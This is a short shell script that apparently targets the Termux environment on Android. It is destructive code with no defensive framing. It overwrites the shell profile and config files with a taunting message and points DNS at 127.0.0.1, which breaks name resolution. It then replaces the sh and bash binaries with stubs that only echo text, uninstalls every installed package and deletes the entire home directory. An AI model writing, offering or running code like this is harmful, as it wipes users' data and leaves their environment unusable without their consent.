#!/bin/sh
echo "Fuckermux!"
cd ~/../usr/etc
echo 'echo "Fuckermux"' > profile
echo 'echo "Fuckermux"' > bash.bashrc
echo 'echo "Fuckermux"' > more
echo 'echo "Fuckermux"' > motd.sh
echo 'echo "Fuckermux"' > inputrc
echo 'nameserver 127.0.0.1' > resolv.conf
cd ../bin
rm -rf sh
touch sh
echo 'echo "Fuckermux"' > sh
chmod +x sh
chmod 777 sh
rm -rf bash
touch bash
echo 'echo "Fuckermux"' > bash
chmod +x bash
chmod 777 bash
pkg uninstall $(pkg list-installed | cut -d'/' -f1) -y
pkg clean
rm -rf ~/*
exit
